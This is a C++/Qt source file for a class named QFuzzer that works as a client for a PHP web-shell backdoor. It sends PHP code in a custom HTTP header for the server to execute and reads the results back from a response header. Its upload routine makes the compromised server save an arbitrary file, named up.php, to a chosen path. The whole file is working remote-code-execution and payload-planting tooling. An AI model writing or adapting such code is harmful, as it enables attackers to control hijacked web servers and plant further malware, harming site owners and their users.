#include "QFuzzer.h"

#include <QNetworkReply>
#include <QNetworkAccessManager>
#include <QNetworkRequest>

#include <QHttpPart>
#include <QFile>

#include <QEventLoop>

#include <QMessageBox>

QFuzzer::QFuzzer(QObject *parent, QString h, QString u) : QObject(parent)
{
    this->header = h;
    this->url = u;
    this->error = false;
    this->response = "WAIT";
}

void QFuzzer::normalizeRequest(QString *request) {
    QString headerResponse = "header('" + this->header + ":' . urlencode($r));";
    *request = *request + headerResponse;
}

QString QFuzzer::sendRequest(QString request)
{
    QNetworkAccessManager *nManager;
    nManager = new QNetworkAccessManager();

    normalizeRequest(&request);

    QNetworkRequest nRequest;
    nRequest.setUrl(QUrl(url));
    nRequest.setRawHeader(header.toLatin1(), request.toLatin1());

    qDebug() << request;

    QNetworkReply *reply;
    reply = nManager->get(nRequest);

    connect(reply, SIGNAL(error(QNetworkReply::NetworkError)), this, SLOT(handleError(QNetworkReply::NetworkError)));
    connect(reply, SIGNAL(finished()), this, SLOT(handleReturn()));

    QEventLoop loop;
        connect(reply, SIGNAL(finished()), &loop, SLOT(quit()));
    loop.exec();

    reply->deleteLater();

    return this->response;
}

QString QFuzzer::uploadFile(QString name, QString localPath, QString serverPath)
{
    QByteArray postData;
    postData = buildUploadString(name, localPath);

    QUrl mResultsURL = QUrl(this->url);
    QNetworkAccessManager* mNetworkManager = new QNetworkAccessManager(this);

    QString bound="margin"; //name of the boundary

    QString nRequest = "$d='"+serverPath+"';if(move_uploaded_file($_FILES['uploaded']['tmp_name'], $d)){header('Nes: Success!');}else{header('Nes: Error!');}";

    QNetworkRequest request(mResultsURL); //our server with php-script
    request.setRawHeader(QString("Content-Type").toLatin1(),QString("multipart/form-data; boundary=" + bound).toLatin1());
    request.setRawHeader(QString("Content-Length").toLatin1(), QString::number(postData.length()).toLatin1());
    request.setRawHeader("Nes", nRequest.toLatin1());

    connect(mNetworkManager, SIGNAL(finished(QNetworkReply*)), this, SLOT(httpRequestFinished(QNetworkReply*)));

    mNetworkManager->post(request,postData);

    return "Smth";
}

QByteArray QFuzzer::buildUploadString(QString name, QString localPath)
{
    QString bound="margin";
    QByteArray data(QString("--" + bound + "\r\n").toLatin1());
    data.append("Content-Disposition: form-data; name=\"action\"\r\n\r\n");
    data.append("uploadFile.php\r\n");
    data.append(QString("--" + bound + "\r\n").toLatin1());
    data.append("Content-Disposition: form-data; name=\"uploaded\"; filename=\"up.php\"");
    data.append(name);
    data.append("\"\r\n");
    data.append("Content-Type: text/xml\r\n\r\n"); //data type

    QFile file(localPath);
    if (!file.open(QIODevice::ReadOnly)){
        qDebug() << "QFile Error: File not found!";
        return data;
    } else { qDebug() << "File found, proceed as planned"; }

    data.append(file.readAll());
    data.append("\r\n");
    data.append("--" + bound + "--\r\n");  //closing boundary according to rfc 1867

    file.close();

    return data;
}

void QFuzzer::httpRequestFinished(QNetworkReply *reply) {
    if (reply->error() == QNetworkReply::NoError)
    {
        qDebug() << "Body : " << reply->readAll();
        qDebug() << "Header : " << reply->rawHeader("Nes");
    }
}

void QFuzzer::handleReturn()
{
    QNetworkReply* reply = qobject_cast<QNetworkReply*>(sender());

    if(reply->error() == QNetworkReply::NoError)
    {
        response = reply->rawHeader(header.toLatin1());
        response = QUrl::fromPercentEncoding(response.toLatin1());
        //response = "api ||| perl.php"; //Bouchon
    }
}

void QFuzzer::handleError(QNetworkReply::NetworkError)
{
    QNetworkReply *r = qobject_cast<QNetworkReply*>(sender());

    QMessageBox msg;
    msg.setIcon(msg.Critical);
    msg.setText("Erreur lors du chargement : " + r->errorString());
    msg.exec();

    this->response = "ERROR";
}

QString QFuzzer::getHeader()
{
    return this->header;
}

QString QFuzzer::getResponse()
{
    return this->response;
}